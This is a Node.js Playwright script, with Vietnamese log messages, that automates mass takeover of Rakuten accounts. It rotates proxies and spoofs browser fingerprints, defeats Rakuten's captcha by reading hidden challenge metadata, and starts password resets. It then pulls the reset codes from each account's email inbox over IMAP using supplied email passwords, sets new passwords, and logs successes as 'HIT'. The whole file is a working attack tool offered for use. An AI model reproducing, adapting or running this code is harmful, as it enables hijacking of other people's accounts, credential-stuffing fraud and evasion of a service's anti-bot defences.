const fs = require("fs");
const path = require("path");
const readline = require("readline/promises");
const { stdin, stdout } = require("process");
const { chromium } = require("playwright");
const Imap = require("imap");
const { simpleParser } = require("mailparser");

const LOG_FILE = path.join(process.cwd(), "rakuten_automation.log");
const USER_DATA_DIR = path.join(process.cwd(), "user-data");

const COLOR_RESET = "\x1b[0m";
const COLOR_INFO = "\x1b[32m";
const COLOR_WARNING = "\x1b[33m";
const COLOR_ERROR = "\x1b[31m";

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
];

let showBrowser = true;
let shuttingDown = false;
let activeBrowsers = new Set();
let successfulAccounts = [];
let failedAccounts = [];

let imapMappings = {
  "mineo.jp": { server: "imaps.mineo.jp", port: 993 },
  "gmail.com": { server: "imap.gmail.com", port: 993 },
  "yahoo.com": { server: "imap.mail.yahoo.com", port: 993 },
  "outlook.com": { server: "outlook.office365.com", port: 993 },
  "hotmail.com": { server: "outlook.office365.com", port: 993 },
  "aol.com": { server: "imap.aol.com", port: 993 },
  "icloud.com": { server: "imap.mail.me.com", port: 993 },
};

function loadDomainsIni() {
  const iniPath = path.join(process.cwd(), "domains.ini");
  if (!fs.existsSync(iniPath)) {
    const defaultIni = `[mineo.jp]
server = imaps.mineo.jp
port = 993

[gmail.com]
server = imap.gmail.com
port = 993

[yahoo.com]
server = imap.mail.yahoo.com
port = 993

[outlook.com]
server = outlook.office365.com
port = 993

[hotmail.com]
server = outlook.office365.com
port = 993

[aol.com]
server = imap.aol.com
port = 993

[icloud.com]
server = imap.mail.me.com
port = 993

[rakuten.jp]
server = popmail.gol.com
port = 993
`;
    try {
      fs.writeFileSync(iniPath, defaultIni, "utf8");
      info(`Đã tạo domains.ini mặc định`);
    } catch (err) {
      warning(`Không thể tạo domains.ini: ${err.message}`);
    }
  }

  if (fs.existsSync(iniPath)) {
    try {
      const content = fs.readFileSync(iniPath, "utf8");
      const lines = content.split(/\r?\n/);
      let currentSection = null;

      for (const line of lines) {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith("#") || trimmed.startsWith(";"))
          continue;

        if (trimmed.startsWith("[") && trimmed.endsWith("]")) {
          currentSection = trimmed.slice(1, -1);
          imapMappings[currentSection] = imapMappings[currentSection] || {
            port: 993,
          };
          continue;
        }

        if (currentSection && trimmed.includes("=")) {
          const parts = trimmed.split("=");
          const key = parts[0].trim();
          const value = parts.slice(1).join("=").trim();
          if (key === "server") imapMappings[currentSection].server = value;
          if (key === "port")
            imapMappings[currentSection].port = parseInt(value, 10);
        }
      }
      info(`Đã tải cấu hình IMAP từ domains.ini`);
    } catch (err) {
      warning(`Không thể tải domains.ini: ${err.message}`);
    }
  }
}

function getImapServer(domain) {
  if (imapMappings[domain]) {
    return imapMappings[domain];
  }
  return { server: `imap.${domain}`, port: 993 };
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function nowTime() {
  return new Date().toLocaleTimeString("en-GB", {
    hour12: false,
    hour: "2-digit",
    minute: "2-digit",
  });
}

function log(level, message) {
  const levelText = level.toUpperCase();
  const line = `${nowTime()} - ${levelText} - ${message}`;
  const fileLine = `${new Date().toISOString()} - ${levelText} - ${message}`;

  fs.appendFileSync(LOG_FILE, `${fileLine}\n`, "utf8");

  let color = "";
  if (levelText === "INFO") color = COLOR_INFO;
  if (levelText === "WARNING") color = COLOR_WARNING;
  if (levelText === "ERROR") color = COLOR_ERROR;

  stdout.write(`${color}${line}${COLOR_RESET}\n`);
}

function info(message) {
  log("info", message);
}

function warning(message) {
  log("warning", message);
}

function error(message) {
  log("error", message);
}

function isInvalidSessionError(err) {
  const message = String(err || "").toLowerCase();
  return (
    message.includes("invalid session id") ||
    message.includes("session deleted as the browser has closed the connection")
  );
}

async function safeShutdownBrowser(browser) {
  if (!browser) return;

  try {
    await browser.close();
  } catch (err) {
    if (!isInvalidSessionError(err)) {
      warning(`Lỗi khi đóng browser: ${String(err)}`);
    }
  } finally {
    activeBrowsers.delete(browser);
  }
}

async function cleanupBrowsers() {
  info("Đang dọn dẹp browser...");
  const snapshot = Array.from(activeBrowsers);
  await Promise.all(snapshot.map((browser) => safeShutdownBrowser(browser)));
}

async function cleanAllUserData(retries = 5, delay = 1000) {
  info("Đang dọn dẹp dữ liệu người dùng...");

  if (!fs.existsSync(USER_DATA_DIR)) {
    return;
  }

  for (let attempt = 1; attempt <= retries; attempt += 1) {
    try {
      fs.rmSync(USER_DATA_DIR, { recursive: true, force: true });
      info("Đã dọn dẹp dữ liệu người dùng thành công.");
      return;
    } catch (err) {
      if (attempt < retries) {
        warning(`Đang dọn dẹp dữ liệu. Thử lại sau ${delay / 1000}s...`);
        await sleep(delay);
      } else {
        error(
          `Không thể dọn dẹp dữ liệu người dùng sau ${retries} lần thử: ${String(err)}`,
        );
      }
    }
  }
}

function signalHandler() {
  if (shuttingDown) return;
  shuttingDown = true;

  (async () => {
    info("Nhận tín hiệu dừng. Đang dọn dẹp...");
    await cleanupBrowsers();
    await cleanAllUserData();
    info("Dọn dẹp hoàn tất. Thoát...");
    process.exit(0);
  })().catch((err) => {
    error(`Lỗi khi xử lý tín hiệu dừng: ${String(err)}`);
    process.exit(1);
  });
}

function parseProxyLine(line) {
  const raw = line.trim();
  if (!raw || raw.startsWith("#")) return null;

  if (raw.includes("://")) {
    try {
      const url = new URL(raw);
      return {
        server: `${url.protocol}//${url.hostname}${url.port ? `:${url.port}` : ""}`,
        username: url.username || undefined,
        password: url.password || undefined,
      };
    } catch {
      return { server: raw };
    }
  }

  if (raw.includes("@")) {
    const [hostPort, credentials] = raw.split("@", 2);
    const [username, password] = credentials.includes(":")
      ? credentials.split(":", 2)
      : credentials.split("-", 2);
    return {
      server: `http://${hostPort}`,
      username,
      password,
    };
  }

  const parts = raw.split(":");
  if (parts.length === 4) {
    const [host, port, username, password] = parts;
    return {
      server: `http://${host}:${port}`,
      username,
      password,
    };
  }

  if (parts.length === 2) {
    return {
      server: `http://${raw}`,
    };
  }

  return { server: raw };
}

function loadInputFiles() {
  try {
    const accounts = [];
    const accountText = fs.readFileSync(
      path.join(process.cwd(), "accounts.txt"),
      "utf8",
    );

    for (const rawLine of accountText.split(/\r?\n/)) {
      const line = rawLine.trim();
      if (!line || line.startsWith("#") || !line.includes("||")) continue;

      const parts = line.split("||");
      if (parts.length >= 2) {
        accounts.push({
          email: parts[0].trim(),
          password: parts[1].trim(),
          changePassword: parts[2].trim(),
        });
      }
    }

    const proxies = [];
    try {
      const proxyText = fs.readFileSync(
        path.join(process.cwd(), "proxy.txt"),
        "utf8",
      );
      for (const rawLine of proxyText.split(/\r?\n/)) {
        const proxy = parseProxyLine(rawLine);
        if (proxy) proxies.push(proxy);
      }
    } catch (err) {
      warning("proxy.txt không tìm thấy. Chạy mà không dùng proxy.");
    }

    if (!accounts.length) {
      throw new Error("Không có tài khoản để xử lý");
    }

    info(`Đã tải ${accounts.length} tài khoản và ${proxies.length} proxy`);
    return { accounts, proxies };
  } catch (err) {
    error(`Lỗi khi tải file đầu vào: ${String(err)}`);
    throw err;
  }
}

async function initDriver(proxy = null) {
  const launchOptions = {
    headless: !showBrowser,
    args: [
      "--disable-blink-features=AutomationControlled",
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-infobars",
      "--ignore-certificate-errors",
      "--allow-insecure-localhost",
      "--allow-running-insecure-content",
      "--disable-web-security",
      "--disable-gpu",
    ],
  };

  if (proxy && proxy.server) {
    launchOptions.proxy =
      proxy.username && proxy.password
        ? {
            server: proxy.server,
            username: proxy.username,
            password: proxy.password,
          }
        : { server: proxy.server };
  }

  const browser = await chromium.launch(launchOptions);
  activeBrowsers.add(browser);

  const context = await browser.newContext({
    userAgent: userAgents[Math.floor(Math.random() * userAgents.length)],
    viewport: showBrowser
      ? { width: 1280, height: 720 }
      : { width: 1920, height: 1080 },
    locale: "en-US",
  });

  await context.addInitScript(() => {
    Object.defineProperty(navigator, "webdriver", { get: () => undefined });
    window.navigator.chrome = { runtime: {} };
    Object.defineProperty(navigator, "plugins", { get: () => [1, 2, 3] });
    Object.defineProperty(navigator, "languages", {
      get: () => ["en-US", "en"],
    });
  });

  const page = await context.newPage();
  return { browser, context, page };
}

async function saveRetryAccountToFile(account, message) {
  fs.appendFileSync(
    path.join(process.cwd(), "chaylai.txt"),
    `${account.email}|${account.password}|${account.name_f || ""}|${message}\n`,
    "utf8",
  );
}

async function saveAccountToFile(filename, account, message) {
  fs.appendFileSync(
    path.join(process.cwd(), filename),
    `${account.email}|${account.password}|${message}\n`,
    "utf8",
  );
}

async function safeClick(locator) {
  try {
    await locator.scrollIntoViewIfNeeded();
    await locator.click({ timeout: 10000 });
  } catch (err) {
    try {
      await locator.evaluate((el) => el.click());
    } catch (fallbackErr) {
      warning(
        `Cả hai phương pháp click đều thất bại: ${String(err)}, ${String(fallbackErr)}`,
      );
      throw fallbackErr;
    }
  }
}

async function getCodeFromEmail(email, password) {
  const domain = email.split("@")[1];
  const { server, port } = getImapServer(domain);

  const imapConfig = {
    user: email,
    password: password,
    host: server,
    port: port,
    tls: true,
    tlsOptions: { rejectUnauthorized: false },
  };

  const timeout = 180000; // 3 minutes
  const startTime = Date.now();
  info(`🔍 ${email} - Đang đợi code từ email...`);

  while (Date.now() - startTime < timeout) {
    try {
      const code = await new Promise((resolve, reject) => {
        const imap = new Imap(imapConfig);

        const onDone = (err, result) => {
          imap.removeAllListeners();
          imap.end();
          if (err) reject(err);
          else resolve(result);
        };

        imap.once("ready", () => {
          imap.openBox("INBOX", true, (err, box) => {
            if (err) return onDone(err);
            if (box.messages.total === 0) return onDone(null, null);

            // Fetch the last few messages to be sure
            const start = Math.max(1, box.messages.total - 4);
            const fetch = imap.seq.fetch(`${start}:${box.messages.total}`, {
              bodies: "",
            });
            let latestFoundCode = null;
            let highestSeqNo = -1;
            let processed = 0;
            const totalToProcess = box.messages.total - start + 1;

            fetch.on("message", (msg, seqno) => {
              msg.on("body", (stream) => {
                simpleParser(stream, (err, parsed) => {
                  processed++;
                  if (
                    !err &&
                    parsed.subject?.includes("Rakuten") &&
                    parsed.subject?.includes("Password Reset")
                  ) {
                    const text = parsed.text || "";
                    let match = text.match(
                      /following code:\s*([a-zA-Z0-9]{20,})/i,
                    );
                    if (!match) match = text.match(/token=([a-zA-Z0-9]{20,})/i);

                    if (match && match[1] && seqno > highestSeqNo) {
                      latestFoundCode = match[1].trim();
                      highestSeqNo = seqno;
                    }
                  }
                  if (processed === totalToProcess) {
                    onDone(null, latestFoundCode);
                  }
                });
              });
            });

            fetch.once("error", (err) => onDone(err));
          });
        });

        imap.once("error", (err) => onDone(err));
        imap.connect();
      });

      if (code) {
        warning(`✅ ${email} - Đã lấy được code: ${code}`);
        return code;
      }
    } catch (err) {
      // Silence intermittent connection errors during polling
    }
    await sleep(15000); // Poll every 15 seconds
  }

  throw new Error("Không nhận được code từ email sau 3 phút.");
}

async function checkRakutenAccount(page, email, password, changePassword) {
  try {
    await sleep(5000);
    info(`🔍 ${email} - Bắt đầu kiểm tra tài khoản...`);

    await page.goto(
      "https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in/forgot_password/email",
      {
        waitUntil: "domcontentloaded",
      },
    );

    await sleep(5000);

    const forgotLink = page
      .getByText("Forgot your password?", { exact: false })
      .first();
    await safeClick(forgotLink);
    await sleep(2000);

    const emailInput = page.locator("#email");
    await emailInput.fill(email);
    await sleep(2000);

    info(`🔍 ${email} - Đang giải captcha nếu có...`);

    const checkboxInfo = await page.evaluate(async () => {
      const challenge = document
        .querySelector("r10-challenger")
        ?.challengerMain?.cores?.values()
        ?.next()?.value?.challenge;

      if (!challenge) return null;

      // Tìm metadata trong object challenge
      const metadata = JSON.parse(challenge.mdata);
      let realId = null;

      // Duyệt qua metadata để tìm ID có render = 0 và là checkbox
      for (const [id, info] of Object.entries(metadata)) {
        if (info.input === "checkbox" && info.render === 0) {
          realId = id;
          break;
        }
      }

      const el = Array.from(challenge.inputFieldsDiv.childNodes).find(
        (item) => item.id === realId,
      );
      const rect = el.getBoundingClientRect();
      return {
        x: rect.left,
        y: rect.top,
        width: rect.width,
        height: rect.height,
      };
    });

    if (!checkboxInfo || checkboxInfo.width === 0) {
      throw new Error("Không lấy được thông tin tọa độ Checkbox");
    }
    // Di chuyển chuột đến tâm của rect đã lấy
    await page.mouse.move(
      checkboxInfo.x + checkboxInfo.width / 2,
      checkboxInfo.y + checkboxInfo.height / 2,
      { steps: 20 }, // Tăng steps lên 20 để mượt hơn, tránh Anti-bot
    );
    await page.mouse.down();
    await sleep(100);
    await page.mouse.up();
    // console.log(
    //   `Click checkbox success at: ${checkboxInfo.x}, ${checkboxInfo.y}`,
    // );

    await sleep(5000);
    // console.log("Click send email");
    const sendEmailButton = page
      .getByText("Send email", { exact: false })
      .first();
    await safeClick(sendEmailButton);
    await sleep(5000);
    let is_acc_live = false;
    try {
      await page
        .getByText("Password reset link successfully sent", { exact: false })
        .first()
        .waitFor({ timeout: 3000 });
      warning(`✅ ${email} - Acc live`);
      is_acc_live = true;
      await sleep(3000);
    } catch {
      // ignore
    }

    try {
      // Role=button Enter the email verification code
      const enterCode = await page.getByRole("button", {
        name: "Enter the email verification code",
      });
      await enterCode.waitFor({ timeout: 3000 });
      await enterCode.click();
      await sleep(3000);
      // Input aria-label="Verification code"
      // Input aria-label="Verification code"
      const code = await getCodeFromEmail(email, password);
      const inputCode = page.locator('input[aria-label="Verification code"]');
      await inputCode.waitFor({ timeout: 3000 });
      await inputCode.fill(code);
      await sleep(3000);

      // Input aria-label="New password"
      const newPassword = page.locator('input[aria-label="New password"]');
      await newPassword.waitFor({ timeout: 3000 });
      await newPassword.fill(changePassword);
      await sleep(3000);

      // Input aria-label="Re-enter password"
      const confirmNewPassword = page.locator(
        'input[aria-label="Re-enter password"]',
      );
      await confirmNewPassword.waitFor({ timeout: 3000 });
      await confirmNewPassword.fill(changePassword);
      await sleep(3000);

      // Button aria-label="Reset password"
      await page
        .getByRole("button", {
          name: "Create a new password",
        })
        .click();
      await sleep(3000);

      // check Password successfully reset or redirect link "https://www.rakuten.co.jp/?code="
      try {
        await page
          .getByText("Password successfully reset", { exact: false })
          .first()
          .waitFor({ timeout: 3000 });
        warning(`✅ ${email} - Password successfully reset`);
        return { ok: true, message: "Password successfully reset" };
      } catch (e) {}

      try {
        // check redirect link
        await page.waitForURL("https://www.rakuten.co.jp/?code=", {
          timeout: 3000,
        });
        warning(`✅ ${email} - Password successfully reset`);
        return { ok: true, message: "Password successfully reset" };
      } catch (e) {}
    } catch (e) {
      console.log(e.message);
      info(`❌ ${email} - K nhận được code.`);
      await sleep(1000000);
      return { ok: is_acc_live, message: "Acc live - K nhận được code" };
    }

    try {
      await page
        .getByText("not associated with any existing accounts", {
          exact: false,
        })
        .first()
        .waitFor({ timeout: 3000 });
      info(`❌ ${email} - Failed.`);
      return { ok: false, message: "Email không tồn tại" };
    } catch {
      // ignore
    }

    try {
      await page
        .getByText("Your account has been locked", { exact: false })
        .first()
        .waitFor({ timeout: 3000 });
      info(`❌ ${email} - locked.`);
      return { ok: false, message: "Acc locked" };
    } catch {
      // ignore
    }

    return { ok: false, message: "Không xác định được kết quả kiểm tra" };
  } catch (err) {
    console.log(err.message);
    await sleep(10000000);
    // Screenshot for debugging
    try {
      const screenshotPath = path.join(
        process.cwd(),
        "screenshots",
        `error_screenshot_${email.replace(/[@.]/g, "_")}_${Date.now()}.png`,
      );
      await page.screenshot({ path: screenshotPath, fullPage: true });
      warning(`Đã lưu screenshot lỗi cho ${email} tại: ${screenshotPath}`);
    } catch (screenshotErr) {
      warning(
        `Không thể lưu screenshot lỗi cho ${email}: ${String(screenshotErr)}`,
      );
    }
    error(`❌ Lỗi trong quá trình Kiểm tra cho ${email}: ${String(err)}`);
    return { ok: false, message: String(err) };
  }
}

async function removeAccountFromInputFile(email) {
  try {
    const filePath = path.join(process.cwd(), "accounts.txt");
    if (!fs.existsSync(filePath)) return;

    const lines = fs.readFileSync(filePath, "utf8").split(/\r?\n/);
    const filtered = lines.filter((line) => {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith("#")) return true;
      const [lineEmail] = trimmed.split("||");
      return lineEmail?.trim() !== email;
    });

    fs.writeFileSync(
      filePath,
      `${filtered.join("\n").replace(/\n+$/, "")}${filtered.length ? "\n" : ""}`,
      "utf8",
    );
  } catch (err) {
    warning(`Lỗi khi cập nhật accounts.txt: ${String(err)}`);
  }
}

async function processAccount(browserFactory, account, accountIndex, proxies) {
  const email = account.email;
  const password = account.password;
  const changePassword = account.changePassword;
  let browser = null;
  let context = null;
  let page = null;

  try {
    info(`Đang xử lý tài khoản ${accountIndex + 1}: ${email}`);
    const proxy = proxies.length
      ? proxies[accountIndex % proxies.length]
      : null;
    ({ browser, context, page } = await browserFactory(proxy));

    const result = await checkRakutenAccount(
      page,
      email,
      password,
      changePassword,
    );
    if (result.ok) {
      successfulAccounts.push(account);
      await saveAccountToFile("successful_accounts.txt", account, "HIT");
    } else {
      failedAccounts.push({ account, error: result.message });
      await saveAccountToFile("failed_accounts.txt", account, result.message);
    }

    info(`Hoàn tất xử lý tài khoản: ${email}`);
  } catch (err) {
    error(`Lỗi xử lý tài khoản ${email}: ${String(err)}`);
    failedAccounts.push({ account, error: String(err) });
    await saveAccountToFile("failed_accounts.txt", account, String(err));
  } finally {
    await removeAccountFromInputFile(email);

    if (context) {
      try {
        await context.close();
      } catch {
        // ignore
      }
    }

    if (browser) {
      await safeShutdownBrowser(browser);
    }
  }
}

async function promptNumber(rl, questionText, fallback) {
  const answer = String(await rl.question(questionText)).trim();
  const parsed = Number.parseInt(answer, 10);
  if (Number.isFinite(parsed) && parsed > 0) return parsed;
  return fallback;
}

async function promptYesNo(rl, questionText, fallback = true) {
  const answer = String(await rl.question(questionText))
    .trim()
    .toLowerCase();
  if (!answer) return fallback;
  return ["y", "yes", "1", "true"].includes(answer);
}

async function main() {
  loadDomainsIni();
  const { accounts, proxies } = loadInputFiles();

  await cleanAllUserData();

  const rl = readline.createInterface({ input: stdin, output: stdout });

  try {
    let numThreads = await promptNumber(rl, "Nhập số luồng để chạy: ", 1);
    if (numThreads > accounts.length) {
      warning(
        `Số luồng (${numThreads}) vượt quá số tài khoản (${accounts.length}). Đặt thành ${accounts.length}.`,
      );
      numThreads = accounts.length;
    }

    showBrowser = await promptYesNo(
      rl,
      "Bạn có muốn hiển thị cửa sổ trình duyệt không? (y/n): ",
      true,
    );

    const nextIndex = { value: 0 };
    const browserFactory = async (proxy) => initDriver(proxy);

    const workers = Array.from({ length: numThreads }, async () => {
      while (true) {
        const accountIndex = nextIndex.value;
        if (accountIndex >= accounts.length) break;
        nextIndex.value += 1;
        const account = accounts[accountIndex];
        await processAccount(browserFactory, account, accountIndex, proxies);
      }
    });

    await Promise.all(workers);

    info("Đã xử lý xong tất cả tài khoản.");
    info(`✅ Kiểm tra thành công: ${successfulAccounts.length}`);
    info(`❌ Kiểm tra thất bại: ${failedAccounts.length}`);

    await cleanAllUserData();
    info("Chương trình hoàn tất. Thoát sau 5 giây...");
    await sleep(5000);
  } finally {
    rl.close();
  }
}

process.on("uncaughtException", (err) => {
  error(`Uncaught exception: ${String(err)}`);
});

process.on("unhandledRejection", (err) => {
  error(`Unhandled rejection: ${String(err)}`);
});

process.on("SIGINT", signalHandler);
process.on("SIGTERM", signalHandler);

main()
  .catch((err) => {
    error(`Lỗi trong hàm main: ${String(err)}`);
    process.exitCode = 1;
  })
  .finally(async () => {
    await cleanupBrowsers();
  });
